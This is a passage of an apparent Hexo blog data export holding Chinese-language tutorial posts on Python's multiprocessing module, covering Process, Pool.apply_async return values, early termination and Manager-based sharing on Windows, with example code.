class=\"comment\">#Manager类实例化代码只能写在main()函数里面</span></div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(10000000):</div><div class=\"line\">        <span class=\"keyword\">if</span> len(lists)&lt;=0:</div><div class=\"line\">        \t<span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">        \t在创建子进程时，需要将lists对象传入，不然无法共享。</div><div class=\"line\">        \t'</span><span class=\"string\">''</span></div><div class=\"line\">            pool.apply_async(<span class=\"built_in\">test</span>,args=(i,lists))<span class=\"comment\">##需要将lists对象传递给子进程，这里比较耗资源，原因可能是因为Manager类是基于通信的。</span></div><div class=\"line\">        <span class=\"keyword\">else</span>:</div><div class=\"line\">            <span class=\"built_in\">break</span></div></pre></td></tr></table></figure>\n<p>说明：与linux版本代码相比，windows下代码将lists的引用放在了main()之后，因为windows下只能在main函数下引用多进程。而在实例化子进程时，必须把Manager对象传递给子进程，否则lists无法被共享，而这个过程会消耗巨大资源，因此性能很差。<br>缺点：速度很慢，因此在windows下想要提前结束所有进程，可以使用获取返回值的方式，参考<a href=\"http://thief.one/2016/11/24/Multiprocessing子进程返回值\">Multiprocessing子进程返回值</a></p>\n<p><hr><br>更多多进程用法，请移驾:    <a href=\"http://thief.one/2016/11/23/Python-multiprocessing/\">Python Multiprocessing</a></p>\n"},{"title":"Multiprocessing.Process","date":"2016-11-24T01:11:50.000Z","comments":1,"_content":"\n　　利用multiprocessing.Process对象可以创建一个进程，该Process对象与Thread对象的用法相同，也有start(), run(), join()等方法。Process类适合简单的进程创建，如需资源共享可以结合multiprocessing.Queue使用；如果想要控制进程数量，则建议使用进程池[Pool](http://thief.one/2016/11/24/Multiprocessing-Pool)类。\n#### Process介绍\n\n##### 构造方法：\n* Process([group [, target [, name [, args [, kwargs]]]]])\n* group: 线程组，目前还没有实现，库引用中提示必须是None；\n* target: 要执行的方法；\n* name: 进程名；\n* args/kwargs: 要传入方法的参数。\n\n##### 实例方法：\n* is_alive()：返回进程是否在运行。\n* join([timeout])：阻塞当前上下文环境的进程程，直到调用此方法的进程终止或到达指定的timeout（可选参数）。\n* start()：进程准备就绪，等待CPU调度。\n* run()：strat()调用run方法，如果实例进程时未制定传入target，这star执行t默认run()方法。\n* terminate()：不管任务是否完成，立即停止工作进程。\n\n##### 属性：\n* authkey\n* daemon：和线程的setDeamon功能一样（将父进程设置为守护进程，当父进程结束时，子进程也结束）。\n* exitcode(进程在运行时为None、如果为–N，表示被信号N结束）。\n* name：进程名字。\n* pid：进程号。\n\n\n#### 创建多进程的两种方法\n\nProcess类中，可以使用两种方法创建子进程。\n\n##### 使用Process创建子进程\n\n说明：用法与Threading相似\n\n```bash\nfrom multiprocessing import Process  #导入Process模块 \nimport os  \n\ndef test(name):\n\t'''\n\t函数输出当前进程ID，以及其父进程ID。\n\t此代码应在Linux下运行，因为windows下os模块不支持getppid()\n\t'''\n    print \"Process ID： %s\" % (os.getpid())  \n    print \"Parent Process ID： %s\" % (os.getppid())  \n\n\nif __name__ == \"__main__\": \n\t'''\n\twindows下，创建进程的代码一下要放在main函数里面\n\t''' \n    proc = Process(target=test, args=('nmask',))  \n    proc.start()  \n    proc.join()  \n```\n\n##### 使用Process类继承创建子进程\n\n说明：通过继承Process类，修改run函数代码。\n\n```bash\nfrom multiprocessing import Process\nimport time\n\nclass MyProcess(Process):\n'''\n继承Process类，类似threading.Thread\n'''\n    def __init__(self, arg):\n        super(MyProcess, self).__init__()\n        #multiprocessing.Process.__init__(self)\n        self.arg = arg\n\n    def run(self):\n    '''\n    重构run函数\n    '''\n        print 'nMask', self.arg\n        time.sleep(1)\n\nif __name__ == '__main__':\n    for i in range(10):\n        p = MyProcess(i)\n        p.start()\n    for i in range(10):\n    \tp.join()\n```\n\n<hr>\n更多多进程用法，请移驾:\t[Python Multiprocessing](http://thief.one/2016/11/23/Python-multiprocessing/)","source":"_posts/Multiprocessing-Process.md","raw":"---\ntitle: Multiprocessing.Process\ndate: 2016-11-24 09:11:50\ncomments: true\ntags: Multiprocessing\ncategories: 编程之道\n---\n\n　　利用multiprocessing.Process对象可以创建一个进程，该Process对象与Thread对象的用法相同，也有start(), run(), join()等方法。Process类适合简单的进程创建，如需资源共享可以结合multiprocessing.Queue使用；如果想要控制进程数量，则建议使用进程池[Pool](http://thief.one/2016/11/24/Multiprocessing-Pool)类。\n#### Process介绍\n\n##### 构造方法：\n* Process([group [, target [, name [, args [, kwargs]]]]])\n* group: 线程组，目前还没有实现，库引用中提示必须是None；\n* target: 要执行的方法；\n* name: 进程名；\n* args/kwargs: 要传入方法的参数。\n\n##### 实例方法：\n* is_alive()：返回进程是否在运行。\n* join([timeout])：阻塞当前上下文环境的进程程，直到调用此方法的进程终止或到达指定的timeout（可选参数）。\n* start()：进程准备就绪，等待CPU调度。\n* run()：strat()调用run方法，如果实例进程时未制定传入target，这star执行t默认run()方法。\n* terminate()：不管任务是否完成，立即停止工作进程。\n\n##### 属性：\n* authkey\n* daemon：和线程的setDeamon功能一样（将父进程设置为守护进程，当父进程结束时，子进程也结束）。\n* exitcode(进程在运行时为None、如果为–N，表示被信号N结束）。\n* name：进程名字。\n* pid：进程号。\n\n\n#### 创建多进程的两种方法\n\nProcess类中，可以使用两种方法创建子进程。\n\n##### 使用Process创建子进程\n\n说明：用法与Threading相似\n\n```bash\nfrom multiprocessing import Process  #导入Process模块 \nimport os  \n\ndef test(name):\n\t'''\n\t函数输出当前进程ID，以及其父进程ID。\n\t此代码应在Linux下运行，因为windows下os模块不支持getppid()\n\t'''\n    print \"Process ID： %s\" % (os.getpid())  \n    print \"Parent Process ID： %s\" % (os.getppid())  \n\n\nif __name__ == \"__main__\": \n\t'''\n\twindows下，创建进程的代码一下要放在main函数里面\n\t''' \n    proc = Process(target=test, args=('nmask',))  \n    proc.start()  \n    proc.join()  \n```\n\n##### 使用Process类继承创建子进程\n\n说明：通过继承Process类，修改run函数代码。\n\n```bash\nfrom multiprocessing import Process\nimport time\n\nclass MyProcess(Process):\n'''\n继承Process类，类似threading.Thread\n'''\n    def __init__(self, arg):\n        super(MyProcess, self).__init__()\n        #multiprocessing.Process.__init__(self)\n        self.arg = arg\n\n    def run(self):\n    '''\n    重构run函数\n    '''\n        print 'nMask', self.arg\n        time.sleep(1)\n\nif __name__ == '__main__':\n    for i in range(10):\n        p = MyProcess(i)\n        p.start()\n    for i in range(10):\n    \tp.join()\n```\n\n<hr>\n更多多进程用法，请移驾:\t[Python Multiprocessing](http://thief.one/2016/11/23/Python-multiprocessing/)","slug":"Multiprocessing-Process","published":1,"updated":"2017-02-14T01:12:03.336Z","layout":"post","photos":[],"link":"","_id":"ciz80dyao00083ofvd7k57bni","content":"<p>　　利用multiprocessing.Process对象可以创建一个进程，该Process对象与Thread对象的用法相同，也有start(), run(), join()等方法。Process类适合简单的进程创建，如需资源共享可以结合multiprocessing.Queue使用；如果想要控制进程数量，则建议使用进程池<a href=\"http://thief.one/2016/11/24/Multiprocessing-Pool\">Pool</a>类。</p>\n<h4 id=\"Process介绍\"><a href=\"#Process介绍\" class=\"headerlink\" title=\"Process介绍\"></a>Process介绍</h4><h5 id=\"构造方法：\"><a href=\"#构造方法：\" class=\"headerlink\" title=\"构造方法：\"></a>构造方法：</h5><ul>\n<li>Process([group [, target [, name [, args [, kwargs]]]]])</li>\n<li>group: 线程组，目前还没有实现，库引用中提示必须是None；</li>\n<li>target: 要执行的方法；</li>\n<li>name: 进程名；</li>\n<li>args/kwargs: 要传入方法的参数。</li>\n</ul>\n<h5 id=\"实例方法：\"><a href=\"#实例方法：\" class=\"headerlink\" title=\"实例方法：\"></a>实例方法：</h5><ul>\n<li>is_alive()：返回进程是否在运行。</li>\n<li>join([timeout])：阻塞当前上下文环境的进程程，直到调用此方法的进程终止或到达指定的timeout（可选参数）。</li>\n<li>start()：进程准备就绪，等待CPU调度。</li>\n<li>run()：strat()调用run方法，如果实例进程时未制定传入target，这star执行t默认run()方法。</li>\n<li>terminate()：不管任务是否完成，立即停止工作进程。</li>\n</ul>\n<h5 id=\"属性：\"><a href=\"#属性：\" class=\"headerlink\" title=\"属性：\"></a>属性：</h5><ul>\n<li>authkey</li>\n<li>daemon：和线程的setDeamon功能一样（将父进程设置为守护进程，当父进程结束时，子进程也结束）。</li>\n<li>exitcode(进程在运行时为None、如果为–N，表示被信号N结束）。</li>\n<li>name：进程名字。</li>\n<li>pid：进程号。</li>\n</ul>\n<h4 id=\"创建多进程的两种方法\"><a href=\"#创建多进程的两种方法\" class=\"headerlink\" title=\"创建多进程的两种方法\"></a>创建多进程的两种方法</h4><p>Process类中，可以使用两种方法创建子进程。</p>\n<h5 id=\"使用Process创建子进程\"><a href=\"#使用Process创建子进程\" class=\"headerlink\" title=\"使用Process创建子进程\"></a>使用Process创建子进程</h5><p>说明：用法与Threading相似</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Process  <span class=\"comment\">#导入Process模块 </span></div><div class=\"line\">import os  </div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(name):</div><div class=\"line\">\t<span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">\t函数输出当前进程ID，以及其父进程ID。</div><div class=\"line\">\t此代码应在Linux下运行，因为windows下os模块不支持getppid()</div><div class=\"line\">\t'<span class=\"string\">''</span></div><div class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">\"Process ID： %s\"</span> % (os.getpid())  </div><div class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">\"Parent Process ID： %s\"</span> % (os.getppid())  </div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>: </div><div class=\"line\">\t<span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">\twindows下，创建进程的代码一下要放在main函数里面</div><div class=\"line\">\t'<span class=\"string\">''</span> </div><div class=\"line\">    proc = Process(target=<span class=\"built_in\">test</span>, args=(<span class=\"string\">'nmask'</span>,))  </div><div class=\"line\">    proc.start()  </div><div class=\"line\">    proc.join()</div></pre></td></tr></table></figure>\n<h5 id=\"使用Process类继承创建子进程\"><a href=\"#使用Process类继承创建子进程\" class=\"headerlink\" title=\"使用Process类继承创建子进程\"></a>使用Process类继承创建子进程</h5><p>说明：通过继承Process类，修改run函数代码。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Process</div><div class=\"line\">import time</div><div class=\"line\"></div><div class=\"line\">class MyProcess(Process):</div><div class=\"line\"><span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">继承Process类，类似threading.Thread</div><div class=\"line\">'<span class=\"string\">''</span></div><div class=\"line\">    def __init__(self, arg):</div><div class=\"line\">        super(MyProcess, self).__init__()</div><div class=\"line\">        <span class=\"comment\">#multiprocessing.Process.__init__(self)</span></div><div class=\"line\">        self.arg = arg</div><div class=\"line\"></div><div class=\"line\">    def run(self):</div><div class=\"line\">    <span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">    重构run函数</div><div class=\"line\">    '<span class=\"string\">''</span></div><div class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">'nMask'</span>, self.arg</div><div class=\"line\">        time.sleep(1)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(10):</div><div class=\"line\">        p = MyProcess(i)</div><div class=\"line\">        p.start()</div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(10):</div><div class=\"line\">    \tp.join()</div></pre></td></tr></table></figure>\n<p><hr><br>更多多进程用法，请移驾:    <a href=\"http://thief.one/2016/11/23/Python-multiprocessing/\">Python Multiprocessing</a></p>\n","excerpt":"","more":"<p>　　利用multiprocessing.Process对象可以创建一个进程，该Process对象与Thread对象的用法相同，也有start(), run(), join()等方法。Process类适合简单的进程创建，如需资源共享可以结合multiprocessing.Queue使用；如果想要控制进程数量，则建议使用进程池<a href=\"http://thief.one/2016/11/24/Multiprocessing-Pool\">Pool</a>类。</p>\n<h4 id=\"Process介绍\"><a href=\"#Process介绍\" class=\"headerlink\" title=\"Process介绍\"></a>Process介绍</h4><h5 id=\"构造方法：\"><a href=\"#构造方法：\" class=\"headerlink\" title=\"构造方法：\"></a>构造方法：</h5><ul>\n<li>Process([group [, target [, name [, args [, kwargs]]]]])</li>\n<li>group: 线程组，目前还没有实现，库引用中提示必须是None；</li>\n<li>target: 要执行的方法；</li>\n<li>name: 进程名；</li>\n<li>args/kwargs: 要传入方法的参数。</li>\n</ul>\n<h5 id=\"实例方法：\"><a href=\"#实例方法：\" class=\"headerlink\" title=\"实例方法：\"></a>实例方法：</h5><ul>\n<li>is_alive()：返回进程是否在运行。</li>\n<li>join([timeout])：阻塞当前上下文环境的进程程，直到调用此方法的进程终止或到达指定的timeout（可选参数）。</li>\n<li>start()：进程准备就绪，等待CPU调度。</li>\n<li>run()：strat()调用run方法，如果实例进程时未制定传入target，这star执行t默认run()方法。</li>\n<li>terminate()：不管任务是否完成，立即停止工作进程。</li>\n</ul>\n<h5 id=\"属性：\"><a href=\"#属性：\" class=\"headerlink\" title=\"属性：\"></a>属性：</h5><ul>\n<li>authkey</li>\n<li>daemon：和线程的setDeamon功能一样（将父进程设置为守护进程，当父进程结束时，子进程也结束）。</li>\n<li>exitcode(进程在运行时为None、如果为–N，表示被信号N结束）。</li>\n<li>name：进程名字。</li>\n<li>pid：进程号。</li>\n</ul>\n<h4 id=\"创建多进程的两种方法\"><a href=\"#创建多进程的两种方法\" class=\"headerlink\" title=\"创建多进程的两种方法\"></a>创建多进程的两种方法</h4><p>Process类中，可以使用两种方法创建子进程。</p>\n<h5 id=\"使用Process创建子进程\"><a href=\"#使用Process创建子进程\" class=\"headerlink\" title=\"使用Process创建子进程\"></a>使用Process创建子进程</h5><p>说明：用法与Threading相似</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Process  <span class=\"comment\">#导入Process模块 </span></div><div class=\"line\">import os  </div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(name):</div><div class=\"line\">\t<span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">\t函数输出当前进程ID，以及其父进程ID。</div><div class=\"line\">\t此代码应在Linux下运行，因为windows下os模块不支持getppid()</div><div class=\"line\">\t'</span><span class=\"string\">''</span></div><div class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">\"Process ID： %s\"</span> % (os.getpid())  </div><div class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">\"Parent Process ID： %s\"</span> % (os.getppid())  </div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>: </div><div class=\"line\">\t<span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">\twindows下，创建进程的代码一下要放在main函数里面</div><div class=\"line\">\t'</span><span class=\"string\">''</span> </div><div class=\"line\">    proc = Process(target=<span class=\"built_in\">test</span>, args=(<span class=\"string\">'nmask'</span>,))  </div><div class=\"line\">    proc.start()  </div><div class=\"line\">    proc.join()</div></pre></td></tr></table></figure>\n<h5 id=\"使用Process类继承创建子进程\"><a href=\"#使用Process类继承创建子进程\" class=\"headerlink\" title=\"使用Process类继承创建子进程\"></a>使用Process类继承创建子进程</h5><p>说明：通过继承Process类，修改run函数代码。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Process</div><div class=\"line\">import time</div><div class=\"line\"></div><div class=\"line\">class MyProcess(Process):</div><div class=\"line\"><span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">继承Process类，类似threading.Thread</div><div class=\"line\">'</span><span class=\"string\">''</span></div><div class=\"line\">    def __init__(self, arg):</div><div class=\"line\">        super(MyProcess, self).__init__()</div><div class=\"line\">        <span class=\"comment\">#multiprocessing.Process.__init__(self)</span></div><div class=\"line\">        self.arg = arg</div><div class=\"line\"></div><div class=\"line\">    def run(self):</div><div class=\"line\">    <span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">    重构run函数</div><div class=\"line\">    '</span><span class=\"string\">''</span></div><div class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">'nMask'</span>, self.arg</div><div class=\"line\">        time.sleep(1)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(10):</div><div class=\"line\">        p = MyProcess(i)</div><div class=\"line\">        p.start()</div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(10):</div><div class=\"line\">    \tp.join()</div></pre></td></tr></table></figure>\n<p><hr><br>更多多进程用法，请移驾:    <a href=\"http://thief.one/2016/11/23/Python-multiprocessing/\">Python Multiprocessing</a></p>\n"},{"title":"Multiprocessing子进程返回值","date":"2016-11-24T02:14:06.000Z","comments":1,"_content":"\n　　在实际使用多进程的时候，可能需要获取到子进程运行的返回值。如果只是用来存储，则可以将返回值保存到一个数据结构中；如果需要判断此返回值，从而决定是否继续执行所有子进程，则会相对比较复杂。另外在Multiprocessing中，可以利用Process与Pool创建子进程，这两种用法在获取子进程返回值上的写法上也不相同。这篇中，我们直接上代码，分析多进程中获取子进程返回值的不同用法，以及优缺点。\n\n\n#### 初级用法（Pool）\n\n目的：存储子进程返回值\n\n说明：如果只是单纯的存储子进程返回值，则可以使用Pool的apply_async异步进程池；当然也可以使用Process，用法与threading中的相同，这里只介绍前者。\n\n实例：当进程池中所有子进程执行完毕后，输出每个子进程的返回值。\n\n```bash\n\nfrom multiprocessing import Pool\n\ndef test(p):     \n    return p\n\nif __name__==\"__main__\":\n    pool = Pool(processes=10)\n    result=[]\n    for i  in xrange(50000):\n       '''\n       for循环执行流程：\n       （1）添加子进程到pool，并将这个对象（子进程）添加到result这个列表中。（此时子进程并没有运行）\n       （2）执行子进程（同时执行10个）\n       '''\n       result.append(pool.apply_async(test, args=(i,)))#维持执行的进程总数为10，当一个进程执行完后添加新进程.       \n    pool.join()\n\n    '''\n    遍历result列表，取出子进程对象，访问get()方法，获取返回值。（此时所有子进程已执行完毕）\n    '''\n    for i in result:\n        print i.get()\n```\n\n错误写法：\n\n```bash\nfor i  in xrange(50000):\n   t=pool.apply_async(test, args=(i,)))\n   print t.get()\n```\n说明：这样会造成阻塞，因为get()方法只能等子进程运行完毕后才能调用成功，否则会一直阻塞等待。如果写在for循环内容，相当于变成了同步，执行效率将会非常低。\n\n\n#### 高级用法（Pool）\n\n目的：父进程实时获取子进程返回值，以此为标记结束所有进程。\n\n##### 实例（一）\n\n执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。\n\n```bash\n\nfrom multiprocessing import Pool\nimport Queue\nimport time\n\ndef test(p):\n    time.sleep(0.001)\n    if p==10000:\n        return True\n    else:\n        return False\n\nif __name__==\"__main__\":\n    pool = Pool(processes=10)\n    q=Queue.Queue()\n    for i  in xrange(50000):\n    \t'''\n    \t将子进程对象存入队列中。\n    \t'''\n        q.put(pool.apply_async(test, args=(i,)))#维持执行的进程总数为10，当一个进程执行完后添加新进程.       \n    '''\n    因为这里使用的为pool.apply_async异步方法，因此子进程执行的过程中，父进程会执行while，获取返回值并校验。\n    '''\n    while 1:\n        if q.get().get():\n            pool.terminate() #结束进程池中的所有子进程。\n            break\n    pool.join()\n```\n\n说明：总共要执行50000个子进程（并发数量为10），当其中一个子进程返回True时，结束进程池。因为使用了apply_async为异步进程，因此在执行完for循环的添加子进程操作后（只是添加并没有执行完所有的子进程），可以直接执行while代码，实时判断子进程返回值是否有True，有的话结束所有进程。\n\n优点：不必等到所有子进程结束再结束程序，只要得到想要的结果就可以提前结束，节省资源。\n\n不足：当需要执行的子进程非常大时，不适用，因为for循环在添加子进程时，要花费很长的时间，虽然是异步，但是也需要等待for循环添加子进程操作结束才能执行while代码，因此会比较慢。\n\n##### 实例（二）\n\n多线程+多进程，添加执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。\n\n```bash\nfrom multiprocessing import Pool\nimport Queue\nimport threading\nimport time\n\ndef test(p):\n    time.sleep(0.001)\n    if p==10000:\n        return True\n    else:\n        return False\n\nif __name__==\"__main__\":\n\n    result=Queue.Queue() #队列\n    pool = Pool()\n\n    def pool_th():\n        for i  in xrange(50000000): ##这里需要创建执行的子进程非常多\n            try:\n                result.put(pool.apply_async(test, args=(i,)))\n            except:\n                break\n\n    def result_th():\n        while 1:\n            a=result.get().get() #获取子进程返回值\n            if a:\n                pool.terminate() #结束所有子进程\n                break\n    '''\n    利用多线程，同时运行Pool函数创建执行子进程，以及运行获取子进程返回值函数。\n    '''\n    t1=threading.Thread(target=pool_th)\n    t2=threading.Thread(target=result_th)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n    pool.join()\n```\n\n执行流程：利用多线程，创建一个执行pool_th函数线程，一个执行result_th函数线程，pool_th函数用来添加进程池，开启进程执行功能函数并将子进程对象存入队列，而result_th()函数用来不停地从队列中取子进程对象，调用get（）方法获取返回值。等发现其中存在子进程的返回值为True时，结束所有进程，最后结束线程。\n\n优点：弥补了实例（一）的不足，即使for循环的子进程数量很多，也能提高性能，因为for循环与判断子进程返回值同时进行。\n\n\n<hr>\n更多多进程用法，请移驾:\t[Python Multiprocessing](http://thief.one/2016/11/23/Python-multiprocessing/)","source":"_posts/Multiprocessing子进程返回值.md","raw":"---\ntitle: Multiprocessing子进程返回值\ndate: 2016-11-24 10:14:06\ncomments: true\ntags: Multiprocessing\ncategories: 编程之道\n---\n\n　　在实际使用多进程的时候，可能需要获取到子进程运行的返回值。如果只是用来存储，则可以将返回值保存到一个数据结构中；如果需要判断此返回值，从而决定是否继续执行所有子进程，则会相对比较复杂。另外在Multiprocessing中，可以利用Process与Pool创建子进程，这两种用法在获取子进程返回值上的写法上也不相同。这篇中，我们直接上代码，分析多进程中获取子进程返回值的不同用法，以及优缺点。\n\n\n#### 初级用法（Pool）\n\n目的：存储子进程返回值\n\n说明：如果只是单纯的存储子进程返回值，则可以使用Pool的apply_async异步进程池；当然也可以使用Process，用法与threading中的相同，这里只介绍前者。\n\n实例：当进程池中所有子进程执行完毕后，输出每个子进程的返回值。\n\n```bash\n\nfrom multiprocessing import Pool\n\ndef test(p):     \n    return p\n\nif __name__==\"__main__\":\n    pool = Pool(processes=10)\n    result=[]\n    for i  in xrange(50000):\n       '''\n       for循环执行流程：\n       （1）添加子进程到pool，并将这个对象（子进程）添加到result这个列表中。（此时子进程并没有运行）\n       （2）执行子进程（同时执行10个）\n       '''\n       result.append(pool.apply_async(test, args=(i,)))#维持执行的进程总数为10，当一个进程执行完后添加新进程.       \n    pool.join()\n\n    '''\n    遍历result列表，取出子进程对象，访问get()方法，获取返回值。（此时所有子进程已执行完毕）\n    '''\n    for i in result:\n        print i.get()\n```\n\n错误写法：\n\n```bash\nfor i  in xrange(50000):\n   t=pool.apply_async(test, args=(i,)))\n   print t.get()\n```\n说明：这样会造成阻塞，因为get()方法只能等子进程运行完毕后才能调用成功，否则会一直阻塞等待。如果写在for循环内容，相当于变成了同步，执行效率将会非常低。\n\n\n#### 高级用法（Pool）\n\n目的：父进程实时获取子进程返回值，以此为标记结束所有进程。\n\n##### 实例（一）\n\n执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。\n\n```bash\n\nfrom multiprocessing import Pool\nimport Queue\nimport time\n\ndef test(p):\n    time.sleep(0.001)\n    if p==10000:\n        return True\n    else:\n        return False\n\nif __name__==\"__main__\":\n    pool = Pool(processes=10)\n    q=Queue.Queue()\n    for i  in xrange(50000):\n    \t'''\n    \t将子进程对象存入队列中。\n    \t'''\n        q.put(pool.apply_async(test, args=(i,)))#维持执行的进程总数为10，当一个进程执行完后添加新进程.       \n    '''\n    因为这里使用的为pool.apply_async异步方法，因此子进程执行的过程中，父进程会执行while，获取返回值并校验。\n    '''\n    while 1:\n        if q.get().get():\n            pool.terminate() #结束进程池中的所有子进程。\n            break\n    pool.join()\n```\n\n说明：总共要执行50000个子进程（并发数量为10），当其中一个子进程返回True时，结束进程池。因为使用了apply_async为异步进程，因此在执行完for循环的添加子进程操作后（只是添加并没有执行完所有的子进程），可以直接执行while代码，实时判断子进程返回值是否有True，有的话结束所有进程。\n\n优点：不必等到所有子进程结束再结束程序，只要得到想要的结果就可以提前结束，节省资源。\n\n不足：当需要执行的子进程非常大时，不适用，因为for循环在添加子进程时，要花费很长的时间，虽然是异步，但是也需要等待for循环添加子进程操作结束才能执行while代码，因此会比较慢。\n\n##### 实例（二）\n\n多线程+多进程，添加执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。\n\n```bash\nfrom multiprocessing import Pool\nimport Queue\nimport threading\nimport time\n\ndef test(p):\n    time.sleep(0.001)\n    if p==10000:\n        return True\n    else:\n        return False\n\nif __name__==\"__main__\":\n\n    result=Queue.Queue() #队列\n    pool = Pool()\n\n    def pool_th():\n        for i  in xrange(50000000): ##这里需要创建执行的子进程非常多\n            try:\n                result.put(pool.apply_async(test, args=(i,)))\n            except:\n                break\n\n    def result_th():\n        while 1:\n            a=result.get().get() #获取子进程返回值\n            if a:\n                pool.terminate() #结束所有子进程\n                break\n    '''\n    利用多线程，同时运行Pool函数创建执行子进程，以及运行获取子进程返回值函数。\n    '''\n    t1=threading.Thread(target=pool_th)\n    t2=threading.Thread(target=result_th)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n    pool.join()\n```\n\n执行流程：利用多线程，创建一个执行pool_th函数线程，一个执行result_th函数线程，pool_th函数用来添加进程池，开启进程执行功能函数并将子进程对象存入队列，而result_th()函数用来不停地从队列中取子进程对象，调用get（）方法获取返回值。等发现其中存在子进程的返回值为True时，结束所有进程，最后结束线程。\n\n优点：弥补了实例（一）的不足，即使for循环的子进程数量很多，也能提高性能，因为for循环与判断子进程返回值同时进行。\n\n\n<hr>\n更多多进程用法，请移驾:\t[Python Multiprocessing](http://thief.one/2016/11/23/Python-multiprocessing/)","slug":"Multiprocessing子进程返回值","published":1,"updated":"2017-02-14T01:12:03.336Z","layout":"post","photos":[],"link":"","_id":"ciz80dyat000c3ofvk1ymy97o","content":"<p>　　在实际使用多进程的时候，可能需要获取到子进程运行的返回值。如果只是用来存储，则可以将返回值保存到一个数据结构中；如果需要判断此返回值，从而决定是否继续执行所有子进程，则会相对比较复杂。另外在Multiprocessing中，可以利用Process与Pool创建子进程，这两种用法在获取子进程返回值上的写法上也不相同。这篇中，我们直接上代码，分析多进程中获取子进程返回值的不同用法，以及优缺点。</p>\n<h4 id=\"初级用法（Pool）\"><a href=\"#初级用法（Pool）\" class=\"headerlink\" title=\"初级用法（Pool）\"></a>初级用法（Pool）</h4><p>目的：存储子进程返回值</p>\n<p>说明：如果只是单纯的存储子进程返回值，则可以使用Pool的apply_async异步进程池；当然也可以使用Process，用法与threading中的相同，这里只介绍前者。</p>\n<p>实例：当进程池中所有子进程执行完毕后，输出每个子进程的返回值。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div 